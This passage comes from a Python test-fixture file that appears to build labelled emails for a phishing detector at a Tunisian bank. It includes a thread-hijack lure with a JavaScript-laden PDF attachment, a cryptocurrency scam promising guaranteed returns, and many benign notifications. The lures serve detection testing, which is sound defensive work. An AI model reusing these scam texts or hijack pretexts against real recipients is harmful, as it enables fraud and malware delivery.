                "CERT - Equipe de Reponse aux Incidents\n"
                "Direction des Systemes d'Information"
            ),
            auth_pass=False,
        ),
    })

    # --- 58. Thread hijack with legitimate-looking attachment ---
    cases.append({
        "name": "thread_hijack_attachment",
        "description": "Hijacked email thread with malicious PDF attachment replacing legitimate one",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="ahmed.benali@fournisseur-agree.tn",
            to_addr="test@test.com",
            subject="Re: Re: Contrat cadre 2024 - Version finale signee",
            body=(
                "Bonjour,\n\n"
                "Suite a notre echange telephonique de ce matin, veuillez trouver "
                "ci-joint la version finale du contrat cadre signee par notre "
                "direction generale.\n\n"
                "Je vous confirme que les modifications demandees par votre service "
                "juridique ont ete integrees (article 7.2 et annexe 3).\n\n"
                "Merci de nous retourner un exemplaire contresigne dans les meilleurs delais.\n\n"
                "Cordialement,\n"
                "Ahmed Benali\n"
                "Directeur Commercial\n"
                "Fournisseur Agree SARL"
            ),
            attachments=[("Contrat_Cadre_2024_Signe.pdf", _pdf_with_js(), "application/pdf")],
            extra_headers={
                "In-Reply-To": "<thread-contrat-2024@imaniabank.com.tn>",
                "References": "<original@imaniabank.com.tn> <reply1@fournisseur-agree.tn>",
            },
            auth_pass=True,
        ),
    })

    # --- 59. Cryptocurrency scam targeting bank employees ---
    cases.append({
        "name": "crypto_scam_employee",
        "description": "Cryptocurrency investment scam targeting bank employees",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="opportunite@crypto-invest-tunisie.com",
            to_addr="test@test.com",
            subject="Opportunite exclusive pour les employes du secteur bancaire",
            body=(
                "Cher(e) professionnel(le) du secteur bancaire,\n\n"
                "En tant qu'expert(e) du monde financier, vous savez mieux que "
                "quiconque que les investissements traditionnels ne suivent plus "
                "l'inflation.\n\n"
                "Notre plateforme de trading algorithmique, deja utilisee par "
                "des cadres de grandes banques tunisiennes, a genere un rendement "
                "moyen de 340% en 2023.\n\n"
                "Nous offrons un acces exclusif aux employes du secteur bancaire:\n"
                "- Investissement minimum: 500 TND\n"
                "- Rendement garanti: 15% par mois\n"
                "- Retrait sous 24h\n\n"
                "Inscrivez-vous maintenant pour beneficier du bonus de bienvenue "
                "de 200 TND:\n"
                "https://crypto-invest-tunisie.com/inscription?ref=BANK2024\n\n"
                "Nombre de places limitees. Offre valable jusqu'au 10 juillet.\n\n"
                "L'equipe Crypto Invest Tunisie"
            ),
            auth_pass=False,
        ),
    })

    return cases


def build_benign_cases() -> list[dict]:
    """Generate clean/legitimate test cases."""
    cases = []

    # --- 1. Normal invoice with PDF ---
    cases.append({
        "name": "legitimate_invoice",
        "description": "Normal business invoice with clean PDF",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="billing@cloudprovider.com",
            to_addr="test@test.com",
            subject="Invoice #CP-2024-1234 for June Services",
            body=(
                "Dear customer,\n\n"
                "Please find attached your invoice for June 2024 cloud services.\n"
                "Total: $127.50\nDue date: July 15, 2024\n\n"
                "Thank you for your business.\nCloud Provider Billing"
            ),
            attachments=[("invoice_CP-2024-1234.pdf",
                         b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\n"
                         b"endobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\n"
                         b"endobj\nxref\n0 3\ntrailer\n<< /Size 3 /Root 1 0 R >>\n"
                         b"startxref\n0\n%%EOF\n",
                         "application/pdf")],
        ),
    })

    # --- 2. LinkedIn notification ---
    cases.append({
        "name": "linkedin_notification",
        "description": "Standard LinkedIn profile view notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="messages-noreply@linkedin.com",
            to_addr="test@test.com",
            subject="Mohamed, you appeared in 42 searches this week",
            body=(
                "Your weekly search stats\n\n"
                "42 people found you in LinkedIn search.\n"
                "See who's looking at your profile:\n"
                "https://www.linkedin.com/me/search-appearances\n\n"
                "Unsubscribe: https://www.linkedin.com/comm/settings\n"
            ),
        ),
    })

    # --- 3. Marketing email with urgency (legitimate) ---
    cases.append({
        "name": "marketing_promo",
        "description": "NordPass promotional offer with time pressure — legitimate",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="no-reply@mail.nordpass.com",
            to_addr="test@test.com",
            subject="Last chance: Premium for $0.99/month — offer expires in 48 hours",
            body=(
                "Upgrade to NordPass Premium\n\n"
                "Limited time offer: Get premium password management for $0.99/month.\n"
                "Offer expires in 48 hours — don't miss out!\n\n"
                "https://nordpass.com/upgrade\n\n"
                "Unsubscribe: https://nordpass.com/unsubscribe\n"
            ),
        ),
    })

    # --- 4. GitHub notification ---
    cases.append({
        "name": "github_notification",
        "description": "GitHub PR review request",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="notifications@github.com",
            to_addr="test@test.com",
            subject="[project/repo] Fix: resolve CORS issue (#234)",
            body=(
                "alice requested your review on this pull request.\n\n"
                "Fix: resolve CORS issue by updating allowed origins\n"
                "https://github.com/project/repo/pull/234\n\n"
                "+12 -3 files changed\n"
            ),
        ),
    })

    # --- 5. Conference registration ---
    cases.append({
        "name": "conference_registration",
        "description": "IEEE conference registration confirmation",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="registration@ieee-conference.org",
            to_addr="test@test.com",
            subject="Registration Confirmed: IEEE ICSE 2024",
            body=(
                "Dear Mohamed,\n\n"
                "Your registration for IEEE ICSE 2024 has been confirmed.\n"
                "Registration deadline for early bird pricing: July 1, 2024.\n\n"
                "Please review the attached schedule.\n"
                "https://conf.ieee.org/icse2024/schedule\n\n"
                "IEEE Conference Services"
            ),
        ),
    })

    # --- 6. Internal team email with document ---
    cases.append({
        "name": "internal_team_doc",
        "description": "Colleague sharing a meeting document — normal business",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="marie.dupont@fournisseur-connu.fr",
            to_addr="test@test.com",
            subject="Re: Compte rendu reunion du 12 mars",
            body=(
                "Bonjour,\n\n"
                "Veuillez trouver ci-joint le compte rendu de notre reunion.\n"
                "Cordialement,\nMarie Dupont"
            ),
            attachments=[("CR_reunion_12mars.pdf",
                         b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\n"
                         b"endobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\n"
                         b"endobj\nxref\n0 3\ntrailer\n<< /Size 3 /Root 1 0 R >>\n"
                         b"startxref\n0\n%%EOF\n",
                         "application/pdf")],
        ),
    })

    # --- 7. Delivery notification ---
    cases.append({
        "name": "delivery_notification",
        "description": "FedEx package tracking update",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="tracking@fedex.com",
            to_addr="test@test.com",
            subject="Your package is out for delivery",
            body=(
                "FedEx Delivery Update\n\n"
                "Your package (tracking: 7892 3456 1234) is out for delivery today.\n"
                "Estimated delivery: 2:00 PM - 6:00 PM\n\n"
                "Track your package: https://www.fedex.com/track?id=789234561234\n"
            ),
        ),
    })

    # --- 8. Newsletter with multiple links (legitimate) ---
    cases.append({
        "name": "newsletter_multilink",
        "description": "DataCamp weekly newsletter with many URLs — normal",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="newsletter@datacamp.com",
            to_addr="test@test.com",
            subject="This Week in Data Science",
            body=(
                "This Week in Data Science\n\n"
                "Top articles:\n"
                "- Introduction to LLMs: https://www.datacamp.com/blog/llm-intro\n"
                "- Python Pandas Tips: https://www.datacamp.com/blog/pandas-tips\n"
                "- ML Interview Guide: https://www.datacamp.com/blog/ml-interview\n\n"
                "Unsubscribe: https://www.datacamp.com/unsubscribe\n"
            ),
        ),
    })

    # ===================================================================
    # EXPANDED BENIGN CORPUS (v3) — 10 additional legitimate scenarios
    # ===================================================================

    # --- 9. Legitimate ImaniIA bank correspondence in French ---
    cases.append({
        "name": "legit_imania_correspondence",
        "description": "Genuine ImaniIA bank correspondence about account opening",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="service.clientele@imaniabank.com.tn",
            to_addr="test@test.com",
            subject="Confirmation d'ouverture de compte - Ref CL-2024-08847",
            body=(
                "Cher(e) client(e),\n\n"
                "Nous avons le plaisir de vous confirmer l'ouverture de votre "
                "compte courant N° 04-780-0012345-67 au sein de notre agence "
                "Les Berges du Lac.\n\n"
                "Votre conseiller clientele, M. Slim Bouazizi, reste a votre "
                "disposition pour toute question relative a la gestion de votre compte.\n\n"
                "Vous pouvez acceder a vos services en ligne sur "
                "https://www.imaniabank.com.tn/espace-client\n\n"
                "Nous vous remercions pour votre confiance.\n\n"
                "Service Clientele\n"
                "ImaniIA Bank - Agence Les Berges du Lac\n"
                "Tel: 71 861 200"
            ),
        ),
    })

    # --- 10. Automated password reset (legitimate) ---
    cases.append({
        "name": "legit_password_reset",
        "description": "Genuine automated password reset from known service",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="noreply@accounts.google.com",
            to_addr="test@test.com",
            subject="Security alert: New sign-in from Windows device",
            body=(
                "Google Account\n\n"
                "New sign-in to your Google Account\n\n"
                "mohamed.stagiaire@gmail.com\n\n"
                "Your Google Account was just signed in to from a new "
                "Windows device. You are receiving this email to make sure "
                "that it was you.\n\n"
                "Device: Windows PC\n"
                "Location: Tunis, Tunisia\n"
                "Time: July 1, 2024 at 9:15 AM (GMT+1)\n\n"
                "If this was you, you can disregard this email. If this wasn't you, "
                "go to https://myaccount.google.com/security to secure your account.\n\n"
                "Google LLC, 1600 Amphitheatre Pkwy, Mountain View, CA 94043"
            ),
        ),
    })

    # --- 11. Legitimate 2FA setup notification ---
    cases.append({
        "name": "legit_2fa_setup",
        "description": "Genuine Microsoft Authenticator 2FA setup notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="msonlineservicesteam@microsoftonline.com",
            to_addr="test@test.com",
            subject="Verify your identity",
            body=(
                "Microsoft account security info\n\n"
                "You recently set up the Microsoft Authenticator app as a "
                "verification method for your account.\n\n"
                "If you did this, you can safely ignore this email.\n\n"
                "If you didn't do this, your account may be compromised. "
                "Please visit https://account.microsoft.com/security to "
                "review your security settings.\n\n"
                "Thanks,\n"
                "The Microsoft account team\n\n"
                "Microsoft Corporation, One Microsoft Way, Redmond, WA 98052"
            ),
        ),
    })

    # --- 12. Newsletter subscription (French tech) ---
    cases.append({
        "name": "legit_french_newsletter",
        "description": "French-language tech newsletter from Journal du Net",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="newsletter@journaldunet.com",
            to_addr="test@test.com",
            subject="JDN - Les tendances tech de la semaine",
            body=(
                "Journal du Net - Newsletter Hebdomadaire\n\n"
                "Bonjour,\n\n"
                "Voici les articles les plus lus cette semaine:\n\n"
                "1. Intelligence artificielle: les banques tunisiennes accelerent\n"
                "   https://www.journaldunet.com/ia-banques-tunisie\n\n"
                "2. Cybersecurite: le cout moyen d'une violation de donnees en 2024\n"
                "   https://www.journaldunet.com/cybersecurite-cout-2024\n\n"
                "3. Cloud souverain: enjeux pour le secteur financier en Afrique\n"
                "   https://www.journaldunet.com/cloud-souverain-afrique\n\n"
                "Se desabonner: https://www.journaldunet.com/preferences\n"
            ),
        ),
    })

    # --- 13. Legitimate invoice/receipt email ---
    cases.append({
        "name": "legit_receipt_ooredoo",
        "description": "Genuine Ooredoo Tunisia mobile bill receipt",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="facture@ooredoo.tn",
            to_addr="test@test.com",
            subject="Votre facture Ooredoo - Juin 2024",
            body=(
                "Ooredoo Tunisie\n\n"
                "Cher(e) client(e),\n\n"
                "Votre facture du mois de juin 2024 est disponible.\n\n"
                "Numero de ligne: 50 XXX XXX\n"
                "Montant: 47.500 TND\n"
                "Date d'echeance: 15 juillet 2024\n\n"
                "Vous pouvez consulter le detail et payer votre facture "
                "depuis votre espace client:\n"
                "https://www.ooredoo.tn/espace-client/factures\n\n"
                "Ou via l'application My Ooredoo.\n\n"
                "Service Client Ooredoo\n"
                "Tel: 1100"
            ),
            attachments=[("Facture_Ooredoo_Juin2024.pdf",
                         b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\n"
                         b"endobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\n"
                         b"endobj\nxref\n0 3\ntrailer\n<< /Size 3 /Root 1 0 R >>\n"
                         b"startxref\n0\n%%EOF\n",
                         "application/pdf")],
        ),
    })

    # --- 14. Internal meeting invitation ---
    cases.append({
        "name": "legit_meeting_invite",
        "description": "Genuine internal meeting invitation from colleague",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="slim.bouazizi@imaniabank.com.tn",
            to_addr="test@test.com",
            subject="Reunion hebdomadaire equipe SI - Mardi 2 juillet 10h00",
            body=(
                "Bonjour a tous,\n\n"
                "Comme chaque semaine, je vous invite a notre reunion d'equipe "
                "pour faire le point sur les projets en cours.\n\n"
                "Date: Mardi 2 juillet 2024\n"
                "Heure: 10h00 - 11h00\n"
                "Lieu: Salle Carthage, 3eme etage\n"
                "Lien Teams: https://teams.microsoft.com/l/meetup-join/19:meeting_abc123\n\n"
                "Ordre du jour:\n"
                "1. Suivi projet migration serveurs\n"
                "2. Point securite (incidents semaine passee)\n"
                "3. Planning conges ete\n\n"
                "Merci de confirmer votre presence.\n\n"
                "Cordialement,\n"
                "Slim Bouazizi\n"
                "Responsable SI"
            ),
        ),
    })

    # --- 15. Legitimate LinkedIn professional notification ---
    cases.append({
        "name": "legit_linkedin_connection",
        "description": "Genuine LinkedIn connection request from recruiter",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="invitations@linkedin.com",
            to_addr="test@test.com",
            subject="Karim Jebali wants to connect on LinkedIn",
            body=(
                "LinkedIn\n\n"
                "Hi Mohamed,\n\n"
                "Karim Jebali, Senior Security Engineer at Deloitte Tunisia, "
                "would like to connect with you on LinkedIn.\n\n"
                "\"Hi Mohamed, I saw your work on email security for the banking "
                "sector. I'd love to connect and exchange ideas.\"\n\n"
                "View profile: https://www.linkedin.com/in/karim-jebali\n"
                "Accept: https://www.linkedin.com/comm/mynetwork/invite-accept/12345\n\n"
                "You are receiving this email because you have a LinkedIn account.\n"
                "Unsubscribe: https://www.linkedin.com/comm/settings\n\n"
                "LinkedIn Corporation, 1000 W Maude Ave, Sunnyvale, CA 94085"
            ),
        ),
    })

    # --- 16. Legitimate automated system report ---
    cases.append({
        "name": "legit_system_report",
        "description": "Automated daily system monitoring report",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="monitoring@infra.imaniabank.com.tn",
            to_addr="test@test.com",
            subject="[AUTO] Rapport quotidien infrastructure - 01/07/2024",
            body=(
                "Rapport de surveillance infrastructure\n"
                "Date: 01/07/2024 06:00 GMT+1\n"
                "Genere automatiquement par Nagios/Prometheus\n\n"
                "Resume:\n"
                "- Serveurs: 47/48 operationnels (srv-backup-02 en maintenance)\n"
                "- Uptime moyen: 99.97%\n"
                "- Espace disque critique: Aucun\n"
                "- Alertes securite: 0 critique, 2 info\n"
                "- Certificats SSL: Tous valides (prochain renouvellement: 15/09/2024)\n\n"
                "Details des alertes info:\n"
                "- [INFO] Pic CPU srv-app-03 (78%) a 02:15 - normalise\n"
                "- [INFO] Mise a jour automatique PostgreSQL 15.7 appliquee\n\n"
                "Aucune action requise.\n\n"
                "-- Equipe Infrastructure SI"
            ),
        ),
    })

    # --- 17. Legitimate bank regulatory circular ---
    cases.append({
        "name": "legit_bct_circular",
        "description": "Genuine BCT regulatory circular forwarded internally",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="conformite@imaniabank.com.tn",
            to_addr="test@test.com",
            subject="FW: Circulaire BCT n°2024-07 - Nouvelles exigences reporting",
            body=(
                "Bonjour,\n\n"
                "Je vous transmets pour information la derniere circulaire de la "
                "Banque Centrale de Tunisie relative aux nouvelles exigences de "
                "reporting pour les etablissements bancaires.\n\n"
                "Points cles:\n"
                "- Nouveau format de reporting des incidents cyber (applicable des septembre 2024)\n"
                "- Renforcement des controles KYC pour les comptes professionnels\n"
                "- Mise a jour des seuils de declaration Tracfin\n\n"
                "Le document complet est disponible sur l'intranet, rubrique "
                "Conformite > Circulaires BCT.\n\n"
                "Merci d'en prendre connaissance et de me faire part de vos "
                "observations eventuelles.\n\n"
                "Cordialement,\n"
                "Nadia Hammami\n"
                "Responsable Conformite"
            ),
        ),
    })

    # --- 18. Legitimate training invitation ---
    cases.append({
        "name": "legit_training_invite",
        "description": "Internal training session invitation for cybersecurity awareness",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="formation@imaniabank.com.tn",
            to_addr="test@test.com",
            subject="Inscription formation: Sensibilisation cybersecurite - Session juillet",
            body=(
                "Direction de la Formation\n"
                "ImaniIA Bank Tunisie\n\n"
                "Cher(e) collaborateur(trice),\n\n"
                "Dans le cadre de notre programme annuel de formation, nous organisons "
                "une session de sensibilisation a la cybersecurite ouverte a l'ensemble "
                "du personnel.\n\n"
                "Details:\n"
                "- Date: Jeudi 11 juillet 2024\n"
                "- Horaire: 14h00 - 16h30\n"
                "- Lieu: Salle de formation, siege social\n"
                "- Intervenant: Cabinet EY Tunisie\n\n"
                "Themes abordes:\n"
                "1. Reconnaitre les tentatives de phishing\n"
                "2. Bonnes pratiques de gestion des mots de passe\n"
                "3. Protection des donnees clients\n"
                "4. Procedures de signalement d'incident\n\n"
                "Pour vous inscrire, repondez a ce mail ou connectez-vous sur "
                "l'intranet > Formation > Catalogue.\n\n"
                "Places limitees a 30 participants.\n\n"
                "Cordialement,\n"
                "Service Formation RH"
            ),
        ),
    })

    # --- 19. Slack workspace notification ---
    cases.append({
        "name": "legit_slack_notification",
        "description": "Standard Slack channel mention notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="notification@slack.com",
            to_addr="test@test.com",
            subject="New message in #project-alpha",
            body=(
                "Karim mentioned you in #project-alpha:\n\n"
                "\"@Mohamed can you review the API specs before Thursday's sync?\"\n\n"
                "Reply in Slack: https://imaniabank.slack.com/archives/C05EXAMPLE\n\n"
                "Manage notifications: https://slack.com/account/notifications\n"
                "Unsubscribe from email notifications: https://slack.com/account/settings"
            ),
            auth_pass=True,
        ),
    })

    # --- 20. Jira ticket assignment ---
    cases.append({
        "name": "legit_jira_assignment",
        "description": "Jira issue assignment notification from Atlassian",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="jira@imaniabank.atlassian.net",
            to_addr="test@test.com",
            subject="[JIRA] (SEC-412) Assigned to you: Update firewall rules for DMZ segment",
            body=(
                "Karim Bouazizi assigned SEC-412 to you:\n\n"
                "Summary: Update firewall rules for DMZ segment\n"
                "Priority: Medium\n"
                "Due: 2024-07-15\n\n"
                "Description:\n"
                "Please review and update the iptables rules for the DMZ network "
                "segment as per the Q3 security hardening plan. Reference document "
                "attached in Confluence: https://imaniabank.atlassian.net/wiki/spaces/SEC/pages/123456\n\n"
                "View issue: https://imaniabank.atlassian.net/browse/SEC-412"
            ),
            auth_pass=True,
        ),
    })

    # --- 21. Google Workspace admin alert ---
    cases.append({
        "name": "legit_google_admin_alert",
        "description": "Google Workspace admin security alert for suspicious login (legitimate)",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="no-reply@accounts.google.com",
            to_addr="test@test.com",
            subject="Security alert: New sign-in from Windows",
            body=(
                "Google\n\n"
                "New sign-in to your Google Account\n\n"
                "Mohamed Ben Ali\nmoham@imaniabank.com.tn\n\n"
                "A new sign-in on Windows\n"
                "We noticed a new sign-in to your Google Account on a Windows device. "
                "If this was you, you don't need to do anything. If not, we'll help "
                "you secure your account.\n\n"
                "Check activity: https://myaccount.google.com/notifications\n\n"
                "You can also see security activity at "
                "https://myaccount.google.com/security-checkup\n\n"
                "You received this email to let you know about important changes "
                "to your Google Account and services.\n"
                "Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA"
            ),
            auth_pass=True,
        ),
    })

    # --- 22. AWS billing notification ---
    cases.append({
        "name": "legit_aws_billing",
        "description": "AWS monthly billing notification with amount",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="no-reply@amazonaws.com",
            to_addr="test@test.com",
            subject="Your AWS bill for June 2024 is available",
            body=(
                "Amazon Web Services\n\n"
                "Hello,\n\n"
                "Your AWS bill for the billing period June 1 - June 30, 2024 "
                "is now available on your AWS account.\n\n"
                "Total: $342.17 USD\n\n"
                "To view your bill, sign in to the AWS Billing Console:\n"
                "https://console.aws.amazon.com/billing/home\n\n"
                "If you have questions about your bill, visit AWS Support:\n"
                "https://aws.amazon.com/support\n\n"
                "Thank you for using Amazon Web Services.\n"
                "Amazon Web Services, Inc."
            ),
            auth_pass=True,
        ),
    })

    # --- 23. Microsoft Teams meeting recap ---
    cases.append({
        "name": "legit_teams_recap",
        "description": "Microsoft Teams meeting recap notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="noreply@email.teams.microsoft.com",
            to_addr="test@test.com",
            subject="Meeting recap: Weekly Security Standup - June 28",
            body=(
                "Microsoft Teams\n\n"
                "Meeting recap\n"
                "Weekly Security Standup\n"
                "Friday, June 28, 2024 | 10:00 AM - 10:30 AM\n\n"
                "Attendees: Karim B., Sana M., Mohamed B.\n\n"
                "Action items:\n"
                "- Mohamed: Complete penetration test report by July 3\n"
                "- Karim: Review vendor security questionnaire\n"
                "- Sana: Update incident response playbook\n\n"
                "Recording: Available in Teams channel\n"
                "Chat: https://teams.microsoft.com/l/message/\n\n"
                "Microsoft Corporation, One Microsoft Way, Redmond, WA 98052"
            ),
            auth_pass=True,
        ),
    })

    # --- 24. Datacamp course completion ---
    cases.append({
        "name": "legit_datacamp_certificate",
        "description": "DataCamp course completion certificate email",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="no-reply@datacamp.com",
            to_addr="test@test.com",
            subject="Congratulations! You completed Introduction to Deep Learning in Python",
            body=(
                "DataCamp\n\n"
                "Congratulations Mohamed!\n\n"
                "You've successfully completed the course:\n"
                "Introduction to Deep Learning in Python\n\n"
                "Course stats:\n"
                "- Duration: 4 hours\n"
                "- Exercises: 15/15 completed\n"
                "- XP earned: 5,500\n\n"
                "View your certificate: https://www.datacamp.com/certificate/DS-00123456\n"
                "Share on LinkedIn: https://www.datacamp.com/certificate/share/DS-00123456\n\n"
                "Keep learning! Your next recommended course:\n"
                "Convolutional Neural Networks for Image Processing\n"
                "https://www.datacamp.com/courses/cnn-image-processing\n\n"
                "Unsubscribe: https://www.datacamp.com/preferences"
            ),
            auth_pass=True,
        ),
    })

    # --- 25. Tunisian government circular ---
    cases.append({
        "name": "legit_tunisian_gov_circular",
        "description": "Tunisian government official circular about banking regulations",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="circulaire@bct.gov.tn",
            to_addr="test@test.com",
            subject="Circulaire BCT n 2024-12: Mise a jour des exigences de reporting",
            body=(
                "Banque Centrale de Tunisie\n"
                "Direction Generale de la Supervision Bancaire\n\n"
                "Circulaire aux etablissements de credit\n"
                "N 2024-12 du 25 juin 2024\n\n"
                "Objet: Mise a jour des exigences de reporting prudentiel\n\n"
                "Mesdames, Messieurs les Directeurs Generaux,\n\n"
                "La presente circulaire a pour objet de preciser les nouvelles "
                "modalites de transmission des rapports prudentiels trimestriels "
                "conformement aux dispositions de la loi n 2016-48.\n\n"
                "Les etablissements de credit sont tenus de transmettre les "
                "documents vises en annexe selon le calendrier suivant:\n"
                "- T3 2024: au plus tard le 15 octobre 2024\n"
                "- T4 2024: au plus tard le 15 janvier 2025\n\n"
                "Pour toute question, veuillez contacter la DGSB au "
                "+216 71 254 000 poste 2145.\n\n"
                "Le Gouverneur,\n"
                "Fethi Zouhair Nouri"
            ),
            auth_pass=True,
        ),
    })

    # --- 26. Supplier payment confirmation (French) ---
    cases.append({
        "name": "legit_supplier_payment_fr",
        "description": "Legitimate supplier confirming receipt of payment in French",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="comptabilite@steg.com.tn",
            to_addr="test@test.com",
            subject="Confirmation de reception de paiement - Facture F-2024-06789",
            body=(
                "STEG - Societe Tunisienne de l'Electricite et du Gaz\n"
                "Service Comptabilite Clients\n\n"
                "Madame, Monsieur,\n\n"
                "Nous accusons reception de votre virement bancaire en reglement "
                "de la facture F-2024-06789 d'un montant de 12,450.000 TND.\n\n"
                "Details du paiement:\n"
                "- Numero de facture: F-2024-06789\n"
                "- Montant: 12,450.000 TND\n"
                "- Date de reception: 26/06/2024\n"
                "- Reference virement: VIR-ATB-20240626-001\n\n"
                "Votre compte est desormais a jour.\n\n"
                "Pour toute question relative a votre compte, veuillez "
                "contacter notre service clientele au 71 839 200.\n\n"
                "Cordialement,\n"
                "Direction de la Comptabilite\n"
                "STEG"
            ),
            auth_pass=True,
        ),
    })

    # --- 27. HR onboarding email ---
    cases.append({
        "name": "legit_hr_onboarding",
        "description": "Internal HR onboarding checklist for new employee",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="rh@imaniabank.com.tn",
            to_addr="test@test.com",
            subject="Bienvenue chez ImaniIA Bank - Documents d'integration",
            body=(
                "Direction des Ressources Humaines\n"
                "ImaniIA Bank Tunisie\n\n"
                "Cher(e) Mohamed,\n\n"
                "Bienvenue au sein de l'equipe ImaniIA Bank!\n\n"
                "Veuillez trouver ci-dessous la liste des documents a fournir "
                "pour completer votre dossier d'integration:\n\n"
                "1. Copie CIN (recto/verso)\n"
                "2. RIB bancaire\n"
                "3. Diplomes certifies conformes\n"
                "4. 2 photos d'identite\n"
                "5. Extrait de naissance\n\n"
                "Merci de transmettre ces documents au bureau RH (3eme etage) "
                "avant le vendredi 5 juillet.\n\n"
                "Votre badge d'acces sera pret lundi matin a l'accueil.\n\n"
                "Cordialement,\n"
                "Sana Meddeb\n"
                "Chargee de recrutement"
            ),
            auth_pass=True,
        ),
    })

    # --- 28. Apple receipt (purchase confirmation) ---
    cases.append({
        "name": "legit_apple_receipt",
        "description": "Apple App Store purchase receipt",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="no_reply@email.apple.com",
            to_addr="test@test.com",
            subject="Your receipt from Apple",
            body=(
                "Apple\n\n"
                "Receipt\n\n"
                "App Store\n"
                "Order ID: MLKG4H2JXR\n"
                "Document No: 1234567890\n\n"
                "Billed to: Visa ****4521\n\n"
                "iCloud+ 50GB              $0.99\n"
                "Subscription Renewal\n"
                "Jun 28, 2024 - Jul 28, 2024\n\n"
                "Total:                     $0.99\n\n"
                "If you didn't authorize this purchase, visit "
                "https://reportaproblem.apple.com\n\n"
                "Apple ID: moham@gmail.com\n"
                "Learn more about your subscription:\n"
                "https://support.apple.com/HT202039\n\n"
                "Apple Inc., One Apple Park Way, Cupertino, CA 95014, USA"
            ),
            auth_pass=True,
        ),
    })

    # --- 29. Plain-text colleague coordination ---
    cases.append({
        "name": "legit_colleague_plain",
        "description": "Simple plain-text email from colleague about meeting",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="karim.bouazizi@imaniabank.com.tn",
            to_addr="test@test.com",
            subject="Re: point demain matin",
            body=(
                "Salut Mohamed,\n\n"
                "OK pour 9h30 demain dans la salle Carthage.\n"
                "Je vais preparer les slides sur l'avancement du POC.\n\n"
                "Tu peux ramener les specs du cahier des charges?\n\n"
                "A demain,\n"
                "Karim"
            ),
            auth_pass=True,
        ),
    })

    # --- 30. University alumni newsletter ---
    cases.append({
        "name": "legit_alumni_newsletter",
        "description": "University alumni newsletter with event announcements",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="alumni@ensi.tn",
            to_addr="test@test.com",
            subject="ENSI Alumni Newsletter - Juin 2024",
            body=(
                "Association des Anciens de l'ENSI\n"
                "Newsletter mensuelle - Juin 2024\n\n"
                "Chers Alumni,\n\n"
                "Evenements a venir:\n"
                "- 12 juillet: Journee portes ouvertes (campus Manouba)\n"
                "- 20 juillet: Afterwork networking au Cafe des Sciences\n"
                "- 5 aout: Hackathon IA pour le bien social\n\n"
                "Opportunites:\n"
                "- Stage PFE disponible chez Vermeg (Big Data)\n"
                "- Poste senior dev chez Sofrecom Tunisie\n\n"
                "Actualites:\n"
                "L'ENSI est classee 2eme ecole d'ingenieurs en Tunisie "
                "selon le classement Webometrics 2024.\n\n"
                "Pour soumettre une annonce: alumni@ensi.tn\n"
                "Se desinscrire: https://alumni.ensi.tn/preferences\n\n"
                "Le Bureau de l'Association"
            ),
            auth_pass=True,
        ),
    })

    # --- 31. Glovo delivery update ---
    cases.append({
        "name": "legit_glovo_delivery",
        "description": "Glovo food delivery order confirmation",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="info@glovoapp.com",
            to_addr="test@test.com",
            subject="Your Glovo order is on its way!",
            body=(
                "Glovo\n\n"
                "Your order is being prepared!\n\n"
                "Order #GL-TUN-284571\n"
                "From: Cafe Saf Saf, Marsa\n\n"
                "1x Kafteji complet          7.500 TND\n"
                "1x Citronnade                3.000 TND\n"
                "Delivery fee                 2.500 TND\n"
                "Total:                      13.000 TND\n\n"
                "Estimated delivery: 25-35 minutes\n"
                "Track your order: https://glovoapp.com/track/GL-TUN-284571\n\n"
                "Need help? https://glovoapp.com/help\n"
                "Unsubscribe: https://glovoapp.com/preferences"
            ),
            auth_pass=True,
        ),
    })

    # --- 32. IEEE paper acceptance ---
    cases.append({
        "name": "legit_ieee_acceptance",
        "description": "IEEE conference paper acceptance notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="notifications@ieee.org",
            to_addr="test@test.com",
            subject="[IEEE SaTML 2025] Paper #142: Notification of Acceptance",
            body=(
                "Dear Mohamed Ben Ali,\n\n"
                "We are pleased to inform you that your paper:\n\n"
                "Title: Trust No Email: A Deterministic Pipeline for LLM-Assisted "
                "Phishing Detection\n"
                "Paper ID: 142\n\n"
                "has been ACCEPTED for presentation at IEEE SaTML 2025.\n\n"
                "Reviews are attached below. Please address the reviewers' comments "
                "in your camera-ready version.\n\n"
                "Camera-ready deadline: September 15, 2024\n"
                "Upload portal: https://edas.info/N31234\n\n"
                "Registration: https://satml.org/registration\n"
                "At least one author must register by August 30.\n\n"
